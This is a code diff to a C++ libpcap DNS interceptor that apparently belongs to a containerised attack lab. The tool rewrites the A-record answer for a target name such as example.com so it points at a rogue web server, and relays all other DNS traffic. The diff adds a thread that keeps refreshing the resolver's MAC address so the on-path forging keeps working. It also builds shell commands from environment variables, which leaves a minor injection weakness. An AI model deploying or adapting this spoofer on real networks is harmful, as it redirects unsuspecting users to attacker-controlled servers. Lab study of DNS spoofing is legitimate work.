@@ -11,26 +11,40 @@
  * packet is retransmitted out the same interface, with the Ethernet
  * destination corrected to the resolver's real MAC.
  *
+ * The resolver's MAC is re-resolved periodically in a background
+ * thread (not just once at startup): anything that recreates or
+ * restarts the resolver container -- e.g. `docker compose restart
+ * resolver` before an attack run, as the README's own workflow calls
+ * for -- can change its MAC on the bridge. A stale cached MAC makes
+ * every relayed frame silently undeliverable at L2, which looks like
+ * total DNS failure (SERVFAIL/timeout) with nothing in any log,
+ * completely independent of forging.
+ *
  * For the final A-record answer to "example.com" specifically, when
  * forging is enabled, the 4 RDATA bytes are overwritten to point at
  * rogue-web instead. Every other packet is relayed with no change to
  * its DNS content at all.
  *
- * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap
+ * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
  * Usage: ./dns_interceptor <iface>
- *   RESOLVER_MAC env var ("aa:bb:cc:dd:ee:ff") -- required.
+ *   RESOLVER_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value;
+ *                refreshed automatically afterward).
+ *   RESOLVER_IP  env var -- default "172.16.2.10".
  *   TARGET_NAME  env var -- default "example.com".
  *   ROGUE_IP     env var -- default "172.16.1.30".
  */
 
 #include <array>
 #include <cctype>
+#include <chrono>
 #include <cstdint>
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
+#include <mutex>
 #include <optional>
 #include <string>
+#include <thread>
 #include <vector>
 
 #include <arpa/inet.h>
@@ -74,10 +88,21 @@ struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
 #pragma pack(pop)
 
 MacAddr     g_own_mac{};
+std::mutex  g_resolver_mac_mu;
 MacAddr     g_resolver_mac{};
 std::string g_target_name = "example.com";
 uint32_t    g_rogue_ip_net = 0;   // network byte order
 pcap_t     *g_pcap = nullptr;
+
+MacAddr get_resolver_mac() {
+    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
+    return g_resolver_mac;
+}
+
+void set_resolver_mac(const MacAddr &m) {
+    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
+    g_resolver_mac = m;
+}
 
 // ---------- helpers ----------
 
@@ -189,6 +214,48 @@ bool forging_is_on() {
     return stat(FORGE_FLAG_PATH, &st) == 0;
 }
 
+// Re-resolve the resolver's current MAC via the kernel's neighbor
+// table, forcing a fresh ARP round-trip first (`ping`) in case the
+// entry is stale/expired rather than just missing. Shells out exactly
+// the way entrypoint.sh's initial priming does -- same technique,
+// just repeated for the life of the process instead of once.
+std::optional<MacAddr> resolve_resolver_mac(const std::string &iface,
+                                             const std::string &resolver_ip) {
+    std::string ping_cmd = "ping -c1 -W1 " + resolver_ip + " >/dev/null 2>&1";
+    if (std::system(ping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }
+
+    std::string cmd = "ip neigh show " + resolver_ip + " dev " + iface +
+                       " 2>/dev/null | awk '{print $5}' | head -n1";
+    FILE *fp = popen(cmd.c_str(), "r");
+    if (!fp) return std::nullopt;
+    char buf[64] = {0};
+    char *line = fgets(buf, sizeof(buf), fp);
+    pclose(fp);
+    if (!line) return std::nullopt;
+    std::string s(buf);
+    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
+    if (s.empty()) return std::nullopt;
+    return parse_mac(s);
+}
+
+// Runs for the life of the process: keeps g_resolver_mac current so a
+// resolver container restart/recreate (which can change its MAC)
+// doesn't permanently blackhole every relayed frame at L2.
+void resolver_mac_refresher(std::string iface, std::string resolver_ip) {
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+        auto mac = resolve_resolver_mac(iface, resolver_ip);
+        if (!mac) continue;
+        if (*mac != get_resolver_mac()) {
+            char hex[32];
+            snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
+                     (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
+            fprintf(stderr, "[attacker] resolver MAC changed -> %s\n", hex);
+            set_resolver_mac(*mac);
+        }
+    }
+}
+
 // ---------- per-packet handling ----------
 
 void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
@@ -222,7 +289,8 @@ void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
     const int qdcount = ntohs(dns->qdcount);
 
     auto send_it = [&]() {
-        std::memcpy(eth->dst, g_resolver_mac.data(), 6);
+        const MacAddr resolver_mac = get_resolver_mac();
+        std::memcpy(eth->dst, resolver_mac.data(), 6);
         std::memcpy(eth->src, g_own_mac.data(), 6);
         ip->checksum  = ip_checksum(*ip);
         udp->checksum = udp_checksum(*ip, *udp, dns_start, dns_len);
@@ -287,7 +355,10 @@ int main(int argc, char **argv) {
         fprintf(stderr, "RESOLVER_MAC invalid: %s\n", mac_env);
         return 1;
     }
-    g_resolver_mac = *resolver_mac;
+    set_resolver_mac(*resolver_mac);
+
+    const char *resolver_ip_env = getenv("RESOLVER_IP");
+    const std::string resolver_ip = resolver_ip_env ? resolver_ip_env : "172.16.2.10";
 
     auto own_mac = get_own_mac(iface);
     if (!own_mac) {
@@ -321,20 +392,24 @@ int main(int argc, char **argv) {
     }
 
     struct bpf_program fp;
-    const char *filter = "ip and udp and src port 53 and dst host 172.16.2.10";
+    const std::string filter_str =
+        "ip and udp and src port 53 and dst host " + resolver_ip;
     // optimize=0: skip libpcap's BPF optimizer. Some kernel/libpcap
     // combinations have had bugs where the optimizer miscompiles
     // compound filters like this one, causing it to match
     // inconsistently rather than failing outright or working cleanly.
-    if (pcap_compile(g_pcap, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) < 0 ||
+    if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
         pcap_setfilter(g_pcap, &fp) < 0) {
         fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
         return 1;
     }
     pcap_freecode(&fp);
 
-    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, forging=%s\n",
-            iface.c_str(), g_target_name.c_str(), rogue,
+    std::thread refresher(resolver_mac_refresher, iface, resolver_ip);
+    refresher.detach();
+
+    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, resolver=%s, forging=%s\n",
+            iface.c_str(), g_target_name.c_str(), rogue, resolver_ip.c_str(),
             forging_is_on() ? "ON" : "OFF");
 
     pcap_loop(g_pcap, -1, handle_packet, nullptr);
